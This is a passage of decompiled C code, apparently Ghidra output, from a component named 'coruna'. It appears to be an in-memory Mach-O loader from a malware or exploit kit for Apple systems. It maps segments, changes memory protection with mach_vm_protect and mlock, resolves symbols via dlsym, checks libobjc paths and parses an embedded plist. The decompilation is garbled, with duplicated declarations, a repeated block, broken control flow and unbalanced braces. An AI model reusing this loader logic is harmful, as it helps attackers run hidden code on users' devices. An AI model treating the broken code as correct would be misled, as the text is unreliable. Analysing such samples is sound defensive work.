}





unsigned long coruna_mlock_range(long *arg,uint64_t val,mach_vm_address_t n,mach_vm_size_t m
                  ,uint64_t p,uint8_t *q)

{
  char err;
  bool flags;
  uint version;
  uint type_id;
  int i;
  unsigned long tag;
  int *flags;
  uint *str;
  vm_map_t target_task;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  if (*arg == 0) {
    err = *(char *)((long)arg + 0x1d);
    flags = err == '\0';
  }
  else {
    err = *(char *)((long)arg + 0x1d);
    flags = err == '\0';
    if (!flags && arg[1] != 0) {
      tag = coruna_mach_vm_protect(*arg,arg[1],val,n,m,p);
      flags = true;
      version = (uint)tag;
      if ((version == 0) && (q != (uint8_t *)0x0)) {
      tag = 0;
      *q = flags;
      }
      return tag;
    }
  }
  target_task = (vm_map_t)val;
  if ((flags) || (((uint)p >> 2 & 1) == 0)) {
    flags = err != '\x01';
  }
  else {
    if ((target_task != 0) && (*(vm_map_t *)k_persist_mach_task_self_slot != target_task)) {
      return 0x14010;
    }
    i = _mlock(n,m);
    if (i != 0) {
      flags = ___error();
      i = *flags;
      str = (uint *)___error();
      version = -*str;
      if (-1 < i) {
        version = *str;
      }
      return (unsigned long)(version | 0x40000000);
    }
    _madvise(n,m,6);
    flags = false;
  }
  type_id = _mach_vm_protect(target_task,n,m,0,(uint)p);
  version = 0;
  if (type_id != 0) {
    version = type_id | 0x80000000;
  }
  tag = (unsigned long)version;
joined_r0x00015974:
  if ((version == 0) && (q != (uint8_t *)0x0)) {
    tag = 0;
    *q = flags;
  }
  return tag;
}





uint64_t coruna_block_literal_init(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t scratch;
  void (*bootargs)(void);
  uint8_t *thread_attr;
  long host_info;
  
  if (handle != 0) {
    scratch = k_persist_nsconcretestackblock_slot;
    scratch = k_persist_rodata_word_1f020;
    bootargs = coruna_macho_pagezero;
    thread_attr = &k_persist_rodata_word_20878;
    host_info = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
    return u;
  }
  return 0xad001;
}





void coruna_macho_foreach_loadcmd_block(uint64_t val)
{
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  
  scratch = k_persist_nsconcretestackblock_slot;
  bootargs = k_persist_rodata_word_1f020;
  thread_attr = coruna_macho_pagezero;
  host_info = &k_persist_rodata_word_20878;
  serial_buf = val;
  coruna_macho_foreach_loadcmd(val,0x19,&scratch);
  return;
}





unsigned long coruna_macho_pagezero(long arg,long val)

{
  mach_vm_address_t address;
  int err;
  uint size;
  unsigned long version;
  uint64_t *block;
  vm_machine_attribute_val_t cache_92;
  
  size = _strncmp((char *)(val + 8),"__PAGEZERO",0xb);
  version = (unsigned long)size;
  if (size != 0) {
    block = *(uint64_t **)(arg + 0x20);
    address = block[10] + *(long *)(val + 0x18);
    err = *(int *)(val + 0x3c);
    if (err == 0) {
      err = 1;
    }
    version = coruna_mlock_range(*block,*(uint32_t *)(block + 0xb),address,
                         *(uint64_t *)(val + 0x20),err,0);
    if ((int)version == 0) {
      cache_92 = 6;
      _mach_vm_machine_attribute
                (*(vm_map_t *)(*(long *)(arg + 0x20) + 0x58),address,
                 *(mach_vm_size_t *)(val + 0x20),1,&cache_92);
      version = 0;
    }
  }
  return version;
}





uint64_t coruna_persist_residual_47(long handle,long addr_2,uint64_t val)
{
  uint64_t *ptr;
  void *ptr;
  uint64_t u;
  
  u = 0x1200a;
  if (((handle != 0) && (addr_2 != 0)) &&
     (ptr = _realloc(*(void **)(handle + 0x98),(unsigned long)(*(int *)(handle + 0xa0) * 0x10 + 0x20)),
     ptr != (void *)0x0)) {
    u = 0;
    *(void **)(handle + 0x98) = ptr;
    ptr = (uint64_t *)((long)ptr + (unsigned long)*(uint *)(handle + 0xa0) * 0x10);
    *(uint *)(handle + 0xa0) = *(uint *)(handle + 0xa0) + 1;
    *ptr = val;
    ptr[1] = addr_2;
  }
  return u;
}





uint64_t coruna_loader_vm_deallocate(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_vm_deallocate();
    if ((int)u == 0) {
      *(uint8_t *)(handle + 0x78) = 1;
      scratch = k_persist_nsconcretestackblock_slot;
      bootargs = k_persist_rodata_word_1f020;
      thread_attr = coruna_macho_unwind_info;
      host_info = &k_persist_rodata_word_20898;
      serial_buf = handle;
      u = coruna_macho_foreach_loadcmd(handle,0,&scratch);
    }
  }
  return u;
}





uint64_t coruna_mach_vm_deallocate(long handle)
{
  uint u;
  kern_return_t lk2;
  uint64_t size;
  mach_vm_size_t size;
  uint64_t *ptr;
  byte err;
  long handle;
  mach_vm_address_t scratch;
  mach_vm_address_t bootargs;
  uint8_t *thread_attr;
  uint64_t host_info;
  void (*serial_buf)(void);
  uint8_t *action;
  uint64_t *block_ctx;
  uint64_t *stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint64_t *path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t *url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t *cache;
  uint64_t cache_20;
  uint64_t cache_21;
  
  cache = &work;
  work = 0;
  cache_20 = k_persist_rodata_word_1ef78;
  cache_21 = 0;
  url_buf = &plist;
  plist = 0;
  json_buf = k_persist_rodata_word_1ef78;
  frame = 0;
  path_buf = &sa_new;
  sa_new = 0;
  tmp_buf = k_persist_rodata_word_1ef78;
  region = 0;
  if (handle == 0) {
    size = 0xad000;
  }
  else {
    thread_attr = k_persist_nsconcretestackblock_slot;
    host_info = k_persist_rodata_word_1ef80;
    serial_buf = coruna_macho_text_seg;
    action = &k_persist_rodata_word_20a48;
    block_ctx = cache;
    stack_guard = url_buf;
    sa_saved = path_buf;
    size = coruna_macho_foreach_loadcmd(handle,0x19,&thread_attr);
    ptr = url_buf;
    if ((int)size == 0) {
      bootargs = url_buf[3];
      if ((bootargs == 0) && (bootargs = 0, path_buf[3] != 0)) {
        bootargs = *(mach_vm_address_t *)(path_buf[3] + 0x18);
        url_buf[3] = bootargs;
      }
      if (*(char *)(handle + 0x1c2) == '\0') {
        size = cache[3];
        if (*(char *)(handle + 0x138) != '\0') {
          size = (long)(int)~(uint)*(long *)k_persist_vm_page_mask_slot &
                 *(long *)k_persist_vm_page_mask_slot + size;
          cache[3] = size;
        }
        lk2 = _mach_vm_allocate(*(vm_map_t *)k_persist_mach_task_self_slot,&bootargs,size,1);
        if (lk2 != 0) {
          size = 0x14004;
          __Block_object_dispose(&sa_new,8);
          __Block_object_dispose(&plist,8);
          __Block_object_dispose(&work,8);
          return size;
        }
        err = *(byte *)(handle + 0x1c2) ^ 1;
        ptr = url_buf;
      }
      else {
        err = 0;
        bootargs = *(mach_vm_address_t *)(handle + 0x148);
        cache[3] = *(uint64_t *)(handle + 0x150);
      }
      handle = ptr[3];
      *(mach_vm_address_t *)(handle + 8) = bootargs;
      *(long *)(handle + 0x168) = handle;
      u = *(uint *)(cache + 3);
      handle = bootargs - handle;
      *(unsigned long *)(handle + 0x10) = (unsigned long)u;
      *(long *)(handle + 0x18) = handle;
      *(byte *)(handle + 0xfa) = err;
      if (*(char *)(handle + 0x138) == '\0') {
        size = 0;
        *(unsigned long *)(handle + 0x48) = (unsigned long)u;
        *(long *)(handle + 0x50) = handle;
        *(mach_vm_address_t *)(handle + 0x40) = bootargs;
        *(uint8_t *)(handle + 0xfb) = 0;
      }
      else {
        scratch = 0;
        lk2 = _mach_vm_allocate(*(vm_map_t *)(handle + 0x58),&scratch,cache[3],1);
        if (lk2 == 0) {
          size = 0;
          *(mach_vm_address_t *)(handle + 0x40) = scratch;
          *(uint64_t *)(handle + 0x48) = cache[3];
          *(mach_vm_address_t *)(handle + 0x50) = scratch - *(long *)(handle + 0x168);
          *(uint8_t *)(handle + 0xfb) = 1;
        }
        else {
          size = 0x1400f;
          if (*(char *)(handle + 0x1c2) == '\0') {
            _mach_vm_deallocate(*(vm_map_t *)k_persist_mach_task_self_slot,bootargs,cache[3]);
            *(mach_vm_address_t *)(handle + 8) = 0;
            *(uint64_t *)(handle + 0x10) = 0;
          }
        }
      }
    }
  }
fail:
  __Block_object_dispose(&sa_new,8);
  __Block_object_dispose(&plist,8);
  __Block_object_dispose(&work,8);
  return size;
}





uint coruna_macho_unwind_info(long handle,int *flags)
{
  long handle;
  unsigned long u;
  unsigned long size;
  int *err;
  int *status;
  char err;
  int err;
  uint version;
  void *ptr;
  ushort port;
  long addr;
  unsigned long tag;
  long off;
  unsigned long *ptr;
  unsigned long kind;
  unsigned long type_id;
  unsigned long type_id_8;
  int *flags;
  int *count;
  unsigned long type_id_9;
  uint64_t *buf;
  
  if (*flags != 0x19) {
    return 0;
  }
  buf = *(uint64_t **)(handle + 0x20);
  if (buf == (uint64_t *)0x0) {
    return 0xad001;
  }
  err = _strncmp((char *)(flags + 2),"__PAGEZERO",0xb);
  if (err == 0) {
    return 0;
  }
  err = _strncmp((char *)(flags + 2),"__LINKEDIT",0xb);
  addr = *(long *)(flags + 6);
  if (err == 0) {
    off = *(long *)(flags + 10);
    handle = buf[3] + addr;
    buf[0x23] = handle;
    buf[0x24] = handle - off;
    type_id_8 = *(unsigned long *)(flags + 8);
    buf[0x25] = type_id_8;
  }
  else {
    off = *(long *)(flags + 10);
    type_id_8 = *(unsigned long *)(flags + 8);
  }
  type_id = buf[3] + addr;
  tag = buf[1];
  if (tag == 0) {
    return 0x14006;
  }
  if (!CARRY8(type_id,type_id_8)) {
    type_id_9 = *(unsigned long *)(flags + 0xc);
    if ((type_id_9 <= type_id_8) && (-1 < (long)buf[0x2a])) {
      kind = buf[0x29];
      u = kind + off;
      if (((kind <= u) &&
          ((((size = kind + buf[0x2a], u < size && (-1 < (long)type_id_9)) &&
            (kind <= u + type_id_9)) && ((u + type_id_9 <= size && (-1 < (long)buf[2]))))))
         && ((tag <= type_id &&
             (((kind = tag + buf[2], type_id < kind && (-1 < (long)type_id_8)) &&
              (tag <= type_id + type_id_8)))))) {
        if (kind < type_id + type_id_8) {
          return 0x14007;
        }
        err = coruna_mlock_range(*buf,*(uint32_t *)k_persist_mach_task_self_slot,type_id,type_id_8,3,0
                            );
        if (err != 0) {
          return 0x14008;
        }
        coruna_persist_trampoline_00010010(type_id,u,type_id_9);
        _bzero((void *)(type_id_9 + type_id),type_id_8 - type_id_9);
        ptr = _realloc((void *)buf[0x10],(unsigned long)(*(int *)(buf + 0x11) * 0x18 + 0x30));
        if (ptr != (void *)0x0) {
          buf[0x10] = ptr;
          ptr = (unsigned long *)((long)ptr + (unsigned long)*(uint *)(buf + 0x11) * 0x18);
          *(uint *)(buf + 0x11) = *(uint *)(buf + 0x11) + 1;
          ptr[1] = type_id_8;
          ptr[2] = 0;
          *ptr = type_id;
          if (*(long *)(flags + 10) == 0) {
            buf[0x20] = buf[3] + *(long *)(flags + 6);
          }
          version = flags[0x10];
          if (version == 0) {
            return 0;
          }
          type_id_8 = 0;
          status = (int *)buf[0x29];
          addr = buf[0x2a];
          err = (int *)((long)status + addr);
          flags = flags + 0x26;
          do {
            if (addr < 0) {
              return 0x1400a;
            }
            count = flags + -0x14;
            if (count < status) {
              return 0x1400a;
            }
            if (err <= count) {
              return 0x1400a;
            }
            if (flags < status) {
              return 0x1400a;
            }
            if (err < flags) {
              return 0x1400a;
            }
            err = (char)flags[-4];
            port = 1;
            if ((err == '\t') || (err == '\x16')) {
              *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | port;
              version = flags[0x10];
            }
            else {
              if (err == '\n') {
                port = 2;
                *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | port;
                version = flags[0x10];
              }
              else {
                err = _strncmp((char *)count,"__eh_frame",0xb);
                if (err == 0) {
                  port = 8;
                  *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | port;
                  version = flags[0x10];
                }
                else {
                  err = _strncmp((char *)count,"__unwind_info",0xe);
                  if (err == 0) {
                    port = 0x10;
                    *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | port;
                    version = flags[0x10];
                  }
                }
              }
            }
            type_id_8 = type_id_8 + 1;
            flags = flags + 0x14;
            if (version <= type_id_8) {
              return 0;
            }
          } while( true );
        }
        version = 0x2015;
        return version | 0x10000;
      }
    }
  }
  version = 0x4007;
done:
  return version | 0x10000;
}





uint64_t
uint64_t coruna_readclass_from_image(int64_t *arg,uint size,char *path,uint64_t val,int flags,uint64_t *id_2)
{
  int err;
  unsigned long u;
  long handle;
  long addr;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  addr = *arg;
  if ((addr == 0 || path == (char *)0x0) || id_2 == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (((*(void (**)(addr + 0xb0) != (void (*)0x0) &&
      (err = (**(void (**)(addr + 0xb0))(*(uint64_t *)(addr + 0xb8),path,val,id_2),
      err == 0)) ||
     ((*(char *)(addr + 0x1c) != '\0' &&
      ((*(char *)((long)arg + 0x1c3) != '\0' &&
       *id_2 = *id_2 & 0x7fffffffff;
       return 0;
}





uint64_t coruna_dlerror(uint64_t val,long handle,char *path,long addr_2,long *off_3)
{
  char err;
  long handle;
  uint64_t u;
  
  u = 0x910006;
  if (((path != (char *)0x0) && (handle != 0)) && (off_3 != (long *)0x0)) {
    err = *path;
    _dlerror();
    if (err == '_') {
      path = path + 1;
    }
    handle = _dlsym(handle,path);
    _dlerror();
    *off_3 = 0;
    if (handle != 0) {
      u = 0;
      *off_3 = handle + addr_2;
    }
  }
  return u;
}





long coruna_macho_seg19_offset(long handle,int flags,int count_2)
{
  long handle;
  int err;
  int status;
  int *err;
  
  err = *(int *)(*(long *)(handle + 0x170) + 0x10);
  if (err != 0) {
    status = 0;
    err = (int *)(*(long *)(handle + 0x148) + 0x20);
    do {
      if (*err == 0x19) {
        if (status == flags) {
          handle = 0x50;
          if (count_2 == 0) {
            handle = 0x18;
          }
          return *(long *)(handle + handle) + *(long *)(err + 6);
        }
        status = status + 1;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  return 0;
}





uint64_t coruna_macho_map_linkedit(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  uint8_t *action;
  uint64_t block_ctx;
  void (*stack_guard)(void);
  uint8_t *sa_saved;
  long sa_new;
  
  if (handle == 0) {
    u = 0x17000;
  }
  else {
    if (*(long *)(handle + 0x120) == 0) {
      action = k_persist_nsconcretestackblock_slot;
      block_ctx = k_persist_rodata_word_1f020;
      stack_guard = coruna_macho_linkedit;
      sa_saved = &k_persist_rodata_word_208b8;
      sa_new = handle;
      u = coruna_macho_foreach_loadcmd(handle,0x19,&action);
      if ((int)u != 0) {
        return u;
      }
    }
    scratch = k_persist_nsconcretestackblock_slot;
    bootargs = k_persist_rodata_word_1f020;
    thread_attr = coruna_load_libobjc;
    host_info = &k_persist_rodata_word_208d8;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0,&scratch);
  }
  return u;
}





uint64_t coruna_macho_linkedit(long handle,long addr_2)
{
  long handle;
  uint64_t u;
  int err;
  long addr;
  long off;
  
  err = _strncmp((char *)(addr_2 + 8),"__LINKEDIT",0xb);
  if (err == 0) {
    addr = *(long *)(handle + 0x20);
    u = *(uint64_t *)(addr_2 + 0x20);
    handle = *(long *)(addr + 0x18) + *(long *)(addr_2 + 0x18);
    off = *(long *)(addr_2 + 0x28);
    *(long *)(addr + 0x118) = handle;
    *(long *)(addr + 0x120) = handle - off;
    *(uint64_t *)(addr + 0x128) = u;
  }
  return 0;
}





unsigned long coruna_load_libobjc(long arg,int *val)

{
  char *obj;
  unsigned long size;
  bool err;
  int status;
  long serial_7;
  ushort tag;
  long ctx_val;
  unsigned long type_id_8;
  unsigned long type_id_12;
  uint type_id_14;
  unsigned long type_id_13;
  long *entry_10;
  uint8_t **lppu13;
  uint8_t ***lpppu14;
  uint64_t cache_82;
  uint8_t **host_info;
  uint8_t **serial_buf;
  uint8_t **cache_20;
  long block_ctx;
  
  type_id_13 = 0;
  block_ctx = *(long *)k_persist_stack_chk_guard_slot;
  status = *val;
  if (status < 0xb) {
    if (-0x7fffffce < status) {
      if (status == -0x7fffffcd) {
        type_id_13 = 0;
        *(int **)(*(long *)(arg + 0x20) + 400) = val;
      }
      else if (status == -0x7fffffcc) {
        type_id_13 = 0;
        *(int **)(*(long *)(arg + 0x20) + 0x198) = val;
      }
      else if (status == 2) {
        type_id_13 = 0x17001;
        if (*(long *)(*(long *)(arg + 0x20) + 0x120) == 0) {
          type_id_13 = 0x17000;
        }
        else {
          *(int **)(*(long *)(arg + 0x20) + 0x1a0) = val;
          serial_7 = *(long *)(arg + 0x20);
          *(unsigned long *)(serial_7 + 0x1b8) =
               *(long *)(serial_7 + 0x120) + (unsigned long)*(uint *)(*(long *)(serial_7 + 0x1a0) + 0x10);
          serial_7 = *(long *)(arg + 0x20);
          if (*(char *)(serial_7 + 0x1c2) == '\0') {
            if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
            ___stack_chk_fail();
            }
            return type_id_13;
          }
          else {
            ctx_val = *(long *)(serial_7 + 0x1a0);
          }
          *(unsigned long *)(serial_7 + 0x1a8) = *(long *)(serial_7 + 0x120) + (unsigned long)*(uint *)(ctx_val + 8);
          serial_7 = *(long *)(arg + 0x20);
          if (*(char *)(serial_7 + 0x1c2) == '\0') {
            type_id_14 = 0;
            if (*(long *)(serial_7 + 0x10) + *(unsigned long *)(serial_7 + 8) <= *(unsigned long *)(serial_7 + 0x1a8) ||
                *(unsigned long *)(serial_7 + 0x1a8) < *(unsigned long *)(serial_7 + 8)) {
              type_id_14 = 0x17001;
            }
            type_id_13 = (unsigned long)type_id_14;
          }
          else {
            type_id_13 = 0;
          }
        }
      }
      if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
      ___stack_chk_fail();
      }
      return type_id_13;
    }
    if (status != -0x7fffffe8) {
      if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
      ___stack_chk_fail();
      }
      return type_id_13;
    }
load_ok_22:
    type_id_13 = 0x17001;
    obj = (char *)((long)val + (unsigned long)(uint)val[2]);
    entry_10 = *(long **)(arg + 0x20);
    if ((char *)entry_10[0x29] <= obj && obj < (char *)entry_10[0x29] + entry_10[0x2a]) {
      type_id_13 = 0x17004;
      if (*entry_10 != 0) {
        lppu13 = (uint8_t **)0x0;
        serial_buf = *(uint8_t ***)(*entry_10 + 0xc0);
        cache_20 = &ptr_persist_fn_24000;
        cache_82 = 0;
        host_info = &ptr_persist_fn_20c48;
        err = (char)entry_10[0x27] != '\0';
        lpppu14 = &serial_buf;
        if (err) {
          lpppu14 = &host_info;
        }
        serial_7 = 1;
        if (!err) {
          serial_7 = 2;
        }
        do {
          if (*val == -0x7fffffe8) {
          status = _strncmp(obj,"/usr/local/lib/libobjc-env.dylib",0x20);
          type_id_14 = 0;
          if (status != 0) {
          type_id_14 = (uint)type_id_13;
          }
          type_id_13 = (unsigned long)type_id_14;
          }
          }
          if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
          ___stack_chk_fail();
          }
          return type_id_13;
          }
          if (status - 0xbU < 5) {
          switch(status) {
          if (serial_7 == 0) {
            if (*val == -0x7fffffe8) {
            status = _strncmp(obj,"/usr/local/lib/libobjc-env.dylib",0x20);
            type_id_14 = 0;
            if (status != 0) {
            type_id_14 = (uint)type_id_13;
            }
            type_id_13 = (unsigned long)type_id_14;
            }
            }
            if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
            ___stack_chk_fail();
            }
            return type_id_13;
            }
            if (status - 0xbU < 5) {
            switch(status) {
            break;
          }
          lppu13 = *lpppu14;
          if (lppu13 != (uint8_t **)0x0) {
            cache_82 = 0;
            type_id_13 = (*(void (*)*lppu13)(lppu13,obj,2,&cache_82);
          }
          lpppu14 = lpppu14 + 1;
          serial_7 = serial_7 + -1;
        } while ((int)type_id_13 != 0);
        type_id_13 = coruna_persist_residual_47(entry_10,lppu13,cache_82);
        if ((int)type_id_13 == 0) {
          serial_7 = *(long *)(arg + 0x20);
          if ((*(char *)(serial_7 + 0x138) == '\0') &&
             (status = _strncmp(obj,"/usr/lib/libobjc.A.d",0x14), status == 0)) {
            type_id_13 = 0;
            *(uint8_t *)(serial_7 + 0x79) = 1;
            *(uint8_t *)(serial_7 + 0x130) = 1;
            *(uint8_t *)(serial_7 + 0x110) = 1;
            if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
            ___stack_chk_fail();
            }
            return type_id_13;
          }
          type_id_13 = 0;
        }
        else {
          (*(void (*)lppu13[1])(lppu13,cache_82);
        }
      }
load_ok_23:
      if (*val == -0x7fffffe8) {
        status = _strncmp(obj,"/usr/local/lib/libobjc-env.dylib",0x20);
        type_id_14 = 0;
        if (status != 0) {
          type_id_14 = (uint)type_id_13;
        }
        type_id_13 = (unsigned long)type_id_14;
      }
    }
    if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail();
    }
    return type_id_13;
  }
  if (status - 0xbU < 5) {
    switch(status) {
    default:
      type_id_13 = 0;
      *(int **)(*(long *)(arg + 0x20) + 0x1b0) = val;
      break;
    case 0xc:
      type_id_13 = 0x17001;
      obj = (char *)((long)val + (unsigned long)(uint)val[2]);
      entry_10 = *(long **)(arg + 0x20);
      if ((char *)entry_10[0x29] <= obj && obj < (char *)entry_10[0x29] + entry_10[0x2a]) {
      type_id_13 = 0x17004;
      if (*entry_10 != 0) {
      lppu13 = (uint8_t **)0x0;
      serial_buf = *(uint8_t ***)(*entry_10 + 0xc0);
      cache_20 = &ptr_persist_fn_24000;
      cache_82 = 0;
      host_info = &ptr_persist_fn_20c48;
      err = (char)entry_10[0x27] != '\0';
      lpppu14 = &serial_buf;
      if (err) {
      lpppu14 = &host_info;
      }
      serial_7 = 1;
      if (!err) {
      serial_7 = 2;
      }
      do {
      if (*val == -0x7fffffe8) {
      status = _strncmp(obj,"/usr/local/lib/libobjc-env.dylib",0x20);
      type_id_14 = 0;
      if (status != 0) {
      type_id_14 = (uint)type_id_13;
      }
      type_id_13 = (unsigned long)type_id_14;
      }
      }
      if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
      ___stack_chk_fail();
      }
      return type_id_13;
      }
      if (status - 0xbU < 5) {
      switch(status) {
      if (serial_7 == 0) {
      if (*val == -0x7fffffe8) {
      status = _strncmp(obj,"/usr/local/lib/libobjc-env.dylib",0x20);
      type_id_14 = 0;
      if (status != 0) {
      type_id_14 = (uint)type_id_13;
      }
      type_id_13 = (unsigned long)type_id_14;
      }
      }
      if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
      ___stack_chk_fail();
      }
      return type_id_13;
      }
      if (status - 0xbU < 5) {
      switch(status) {
      break;
      }
      lppu13 = *lpppu14;
      if (lppu13 != (uint8_t **)0x0) {
      cache_82 = 0;
      type_id_13 = (*(void (*)*lppu13)(lppu13,obj,2,&cache_82);
      }
      lpppu14 = lpppu14 + 1;
      serial_7 = serial_7 + -1;
      } while ((int)type_id_13 != 0);
      type_id_13 = coruna_persist_residual_47(entry_10,lppu13,cache_82);
      if ((int)type_id_13 == 0) {
      serial_7 = *(long *)(arg + 0x20);
      if ((*(char *)(serial_7 + 0x138) == '\0') &&
      (status = _strncmp(obj,"/usr/lib/libobjc.A.d",0x14), status == 0)) {
      type_id_13 = 0;
      *(uint8_t *)(serial_7 + 0x79) = 1;
      *(uint8_t *)(serial_7 + 0x130) = 1;
      *(uint8_t *)(serial_7 + 0x110) = 1;
      if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
      ___stack_chk_fail();
      }
      return type_id_13;
      }
      type_id_13 = 0;
      }
      else {
      (*(void (*)lppu13[1])(lppu13,cache_82);
      }
      }
      load_ok_23:
      if (*val == -0x7fffffe8) {
      status = _strncmp(obj,"/usr/local/lib/libobjc-env.dylib",0x20);
      type_id_14 = 0;
      if (status != 0) {
      type_id_14 = (uint)type_id_13;
      }
      type_id_13 = (unsigned long)type_id_14;
      }
      }
      if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
      ___stack_chk_fail();
      }
      return type_id_13;
    }
  }
  else {
    if (status != 0x1a) {
      if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
      ___stack_chk_fail();
      }
      return type_id_13;
    }
    serial_7 = *(long *)(arg + 0x20);
    tag = *(ushort *)(serial_7 + 0x1c0) | 4;
code_r0x00016868:
    type_id_13 = 0;
    *(ushort *)(serial_7 + 0x1c0) = tag;
  }
load_ok_20:
  if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail();
  }
  return type_id_13;
}





unsigned long coruna_plist_dict(long *arg)

{
  int *count;
  int *idx;
  uint version;
  int status;
  char *ptr;
  char *buf;
  char *block;
  char *entry;
  size_t ls9;
  long *entry_11;
  char *copy;
  unsigned long type_id_9;
  unsigned long type_id_10;
  long serial_8;
  unsigned long type_id_15;
  uint8_t *cache_93;
  uint64_t cache_94;
  void (*cache_95)(void);
  uint8_t *cache_96;
  uint64_t *stack_guard;
  uint64_t *cache_97;
  uint64_t *sa_saved;
  uint64_t cache_98;
  uint64_t *path_buf;
  uint64_t tmp_buf;
  uint32_t cache_99;
  uint64_t plist;
  uint64_t *cache_100;
  uint64_t json_buf;
  uint32_t frame;
  uint64_t work;
  uint64_t *cache;
  uint64_t cache_101;
  uint8_t cache_80;
  uint32_t cache_81[2];
  char *cache_54;
  uint32_t cache_82;
  uint32_t cache_30;
  uint32_t host_info[2];
  uint32_t *serial_buf;
  long cache_20;
  
  cache_20 = *(long *)k_persist_stack_chk_guard_slot;
  type_id_9 = 0xad001;
  if ((arg == (long *)0x0) || (entry_11 = (long *)*arg, entry_11 == (long *)0x0))
  if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
  return type_id_9;
  }
  ___stack_chk_fail();
  if ((*entry_11 == 0) ||
     ((*(char *)((long)entry_11 + 0x1d) == '\0' || entry_11[1] == 0 || (arg[0x23] == 0)))) {
    type_id_9 = 0;
    if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return type_id_9;
    }
    ___stack_chk_fail();
  }
  stack_guard = &work;
  work = 0;
  cache_101 = k_persist_rodata_word_1ef78;
  cache_80 = 0;
  cache_97 = &plist;
  plist = 0;
  json_buf = k_persist_rodata_word_1ef78;
  frame = 0;
  sa_saved = &cache_98;
  cache_98 = 0;
  tmp_buf = k_persist_rodata_word_1ef78;
  cache_99 = 0;
  cache_93 = k_persist_nsconcretestackblock_slot;
  cache_94 = k_persist_rodata_word_1ef80;
  cache_95 = coruna_wire_store_u32_pair;
  cache_96 = &k_persist_rodata_word_208f8;
  path_buf = sa_saved;
  cache_100 = cache_97;
  cache = stack_guard;
  status = coruna_macho_foreach_loadcmd(arg,0x1d,&cache_93);
  type_id_9 = 0;
  if (status == 0) {
    if (*(char *)(cache + 3) == '\0') {
      type_id_9 = 0;
    }
    else {
      type_id_9 = 0xad014;
      if ((*(uint *)(cache_100 + 3) != 0) && (*(int *)(path_buf + 3) != 0)) {
        count = (int *)((unsigned long)*(uint *)(cache_100 + 3) + arg[0x29]);
        if (*count != -0x3ff32106) {
          type_id_9 = 0;
        }
        else {
          type_id_15 = 0;
          do {
            version = (count[2] & 0xff00ff00U) >> 8 | (count[2] & 0xff00ffU) << 8;
            if ((version >> 0x10 | version << 0x10) <= type_id_15) {
              type_id_9 = 0;
              break;
            }
          if (count[type_id_15 * 2 + 3] == 0x5000000) {
            version = (count[type_id_15 * 2 + 4] & 0xff00ff00U) >> 8 |
                    (count[type_id_15 * 2 + 4] & 0xff00ffU) << 8;
            idx = (int *)((long)count + (unsigned long)(version >> 0x10 | version << 0x10));
            version = (idx[1] & 0xff00ff00U) >> 8 | (idx[1] & 0xff00ffU) << 8;
            version = version >> 0x10 | version << 0x10;
            if (*idx != 0x7171defa || version < 9) {
              type_id_9 = 0xad014;
              break;
            }
            type_id_10 = (unsigned long)(version - 8);
            ptr = _strndup((char *)(idx + 2),type_id_10);
            if (ptr == (char *)0x0) {
              type_id_9 = 0xad009;
              break;
            }
            buf = _strstr(ptr,"<dict>");
            if (buf == (char *)0x0) {
              buf = (char *)0x0;
              version = 0xad014;
            }
            else {
              entry = (char *)0x0;
              copy = buf;
              do {
                block = entry;
                entry = _strstr(copy,"</dict>");
                copy = entry + 1;
              } while (entry != (char *)0x0);
              if (block == (char *)0x0) {
                buf = (char *)0x0;
                version = 0xad014;
              }
              else {
                block[7] = '\0';
                buf = _strdup(buf);
                version = 0xad009;
                if (buf != (char *)0x0) {
                  version = 0;
                }
              }
            }
            type_id_9 = (unsigned long)version;
            _bzero(ptr,type_id_10);
            _free(ptr);
            if (version != 0) break;
            type_id_9 = 0xad001;
            if ((buf != (char *)0x0) && (type_id_9 = 0xad001, *buf != '\0')) {
              entry_11 = (long *)*arg;
              type_id_9 = 0xad001;
              if (entry_11 != (long *)0x0) {
                serial_8 = *entry_11;
                type_id_9 = 0xad001;
                if (serial_8 != 0) {
                  cache_81[0] = (uint32_t)arg[0xb];
                  cache_54 = buf;
                  ls9 = _strlen(buf);
                  cache_82 = (uint32_t)ls9;
                  cache_30 = 1;
                  host_info[0] = 0x40000010;
                  serial_buf = cache_81;
                  type_id_9 = (**(void (**)(serial_8 + 0x40))(serial_8,entry_11 + 1,host_info,1,0);
                }
              }
            }
            ls9 = _strlen(buf);
            _bzero(buf,ls9);
            _free(buf);
          }
          else {
